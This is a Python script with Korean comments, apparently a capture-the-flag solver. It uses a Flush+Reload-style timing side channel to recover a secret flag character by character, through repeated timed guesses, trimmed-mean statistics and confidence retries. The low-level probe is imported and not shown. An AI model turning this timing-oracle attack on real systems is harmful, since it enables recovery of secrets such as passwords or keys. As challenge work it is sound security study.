import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
from pyreload.run import get_time_from_run


CHAR_SET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
NOISE_SAMPLES = 15  # 통계적 신뢰도를 위해 증가
MAX_LENGTH = 256  # 플래그의 최대 길이 설정


def test_character(c, known_flag, delay):
    """
    단일 문자를 테스트하는 함수 (병렬 실행용)
    
    Args:
        c: 테스트할 문자
        known_flag: 현재까지 찾은 플래그
        delay: 각 시도 사이의 지연 시간
    
    Returns:
        (문자, 중간값 시간, 성공여부) 튜플, 실패 시 (문자, None, False)
    """
    test_guess = known_flag + c
    time_measurements = []
    
    for _ in range(NOISE_SAMPLES):
        result = get_time_from_run(test_guess, delay=delay)
        time_val, is_success = result
        
        # Flag found!
        if is_success:
            return (c, 0, True, 0)  # (char, time, success, std_dev)
        
        if time_val is None:
            return (c, None, False, 0)
        time_measurements.append(time_val)
    
    # 이상값 제거: 상위/하위 20% 제거 후 평균 계산 (Trimmed Mean)
    sorted_times = sorted(time_measurements)
    trim_count = max(1, len(sorted_times) // 5)  # 20% 제거
    trimmed_times = sorted_times[trim_count:-trim_count] if len(sorted_times) > 2 else sorted_times
    
    reliable_time = statistics.mean(trimmed_times)
    std_dev = statistics.stdev(trimmed_times) if len(trimmed_times) > 1 else 0
    
    return (c, reliable_time, False, std_dev)


def run_attack(delay, max_workers):
    """
    병렬 처리를 사용한 Flush+Reload 공격
    
    Args:
        delay: 각 시도 사이의 지연 시간 (기본값: 0.032초)
        max_workers: 병렬 처리에 사용할 최대 워커 수 (기본값: 3)
    """
    known_flag = ""

    position = 0
    while position < MAX_LENGTH:
        results = {}
        retry_count = 0
        max_retries = 3  # 최대 재시도 횟수
        
        while retry_count <= max_retries:
            if retry_count > 0:
                print(f"\n🔄 Retrying position {position + 1} (Attempt {retry_count + 1}/{max_retries + 1})...")
            else:
                print(f"\n{'='*60}")
                print(f"Position {position + 1}: Testing {len(CHAR_SET)} characters in parallel...")
                print(f"{'='*60}")
            
            # 병렬로 모든 문자 테스트
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # 모든 문자에 대한 작업 제출
                futures = {
                    executor.submit(test_character, c, known_flag, delay): c 
                    for c in CHAR_SET
                }
                
                # 완료되는 순서대로 결과 수집
                completed_count = 0
                results = {}  # {char: (time, std_dev)}
                for future in as_completed(futures):
                    char, time_val, is_success, std_dev = future.result()
                    
                    # Flag found!
                    if is_success:
                        known_flag += char
                        print(f"\n\n{'='*60}")
                        print(f"🎉 SUCCESS! Flag found: {known_flag}")
                        print(f"{'='*60}")
                        return known_flag
                    
                    if time_val is None:
                        print("\n\nAbort! Test failed for character:", char)
                        print("Last successful guess:", known_flag)
                        return known_flag
                    
                    results[char] = (time_val, std_dev)
                    completed_count += 1
            
            print()  # 진행 바 후 줄바꿈
            
            # 가장 긴 실행 시간을 가진 문자 찾기
            best_char = max(results, key=lambda k: results[k][0])
            best_time, best_std = results[best_char]
            
            # 신뢰도 검증: 1위와 2위의 차이 확인
            sorted_results = sorted(results.items(), key=lambda x: x[1][0], reverse=True)
            confidence_ok = True
            
            if len(sorted_results) >= 2:
                second_char, (second_time, second_std) = sorted_results[1]
                time_diff = best_time - second_time
                margin_ratio = time_diff / best_time if best_time > 0 else 0
                
                # 경고: 차이가 3% 미만이면 불확실
                if margin_ratio < 0.03:
                    confidence_ok = False
                    print(f"\n⚠️  WARNING: Low confidence! Difference only {time_diff:.1f} ({margin_ratio*100:.1f}%)")
                    
                    if retry_count < max_retries:
                        print(f"   Retrying to get more reliable result...")
                        retry_count += 1
                        continue  # 루프 재시도
                    else:
                        print(f"   Max retries reached. Proceeding with best guess.")
            
            # 신뢰도가 충분하거나 최대 재시도 도달
            if confidence_ok or retry_count >= max_retries:
                break
        
        known_flag += best_char
        
        # 결과 출력
        print(f"\n✓ Found next char: '{best_char}' (Time: {best_time:.1f}, σ={best_std:.1f})")
        print(f"📝 Current Flag: {known_flag}")
        
        # 상위 5개 후보 출력 (디버깅용)
        top_5 = sorted_results[:5]
        print(f"\nTop 5 candidates:")
        for idx, (c, (t, std)) in enumerate(top_5, 1):
            marker = "★" if c == best_char else " "
            print(f"  {marker} {idx}. '{c}' -> {t:.1f} (σ={std:.1f})")
        
        position += 1
    
    return known_flag
